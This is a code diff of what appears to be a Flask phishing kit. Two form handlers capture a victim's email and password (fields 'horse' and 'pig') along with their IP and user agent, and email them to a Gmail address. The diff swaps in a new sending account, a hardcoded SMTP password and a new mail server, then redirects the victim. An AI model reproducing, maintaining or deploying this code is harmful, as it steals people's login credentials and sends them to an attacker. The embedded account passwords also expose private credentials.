@@ -82,10 +82,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@domainshieldtech.bio"
+        sender_email = "log@guide-level.com"
         sender_emaill = "contact"
         receiver_email = "bcjung0071@gmail.com"
-        password = "vip6ebdd04ea6df"
+        password = "!p&4Ke_@M2HR"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW UPDATE DEC"
@@ -101,8 +101,8 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("77.83.196.189", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
 
@@ -120,10 +120,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@domainshieldtech.bio"
+        sender_email = "log@guide-level.com"
         sender_emaill = "contact"
         receiver_email = "bcjung0071@gmail.com"
-        password = "vip6ebdd04ea6df"
+        password = "!p&4Ke_@M2HR"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "NEW UPDATE DEC "
@@ -139,8 +139,8 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("77.83.196.189", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
 
